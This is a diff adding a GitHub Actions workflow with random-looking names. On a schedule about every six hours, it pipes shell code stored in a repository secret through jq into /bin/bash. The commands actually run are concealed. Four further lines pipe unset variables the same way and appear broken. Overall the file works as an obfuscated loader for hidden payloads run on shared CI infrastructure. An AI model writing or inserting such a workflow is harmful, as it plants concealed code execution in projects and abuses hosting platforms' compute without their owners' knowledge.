@@ -1,0 +1,22 @@
+name: xuzhibai3856
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuzhibai3856
+        env:
+          wbce962: ${{ secrets.wbce962 }}
+        run: |
+          echo $wbce962 | jq -r .dipv6 | /bin/bash
+          echo $xy08404 | jq -r .ks23779 | /bin/bash
+          echo $ppxj41812 | jq -r .mr9 | /bin/bash
+          echo $qoq29170 | jq -r .azmp1 | /bin/bash
+          echo $znwwk03 | jq -r .d666 | /bin/bash
+
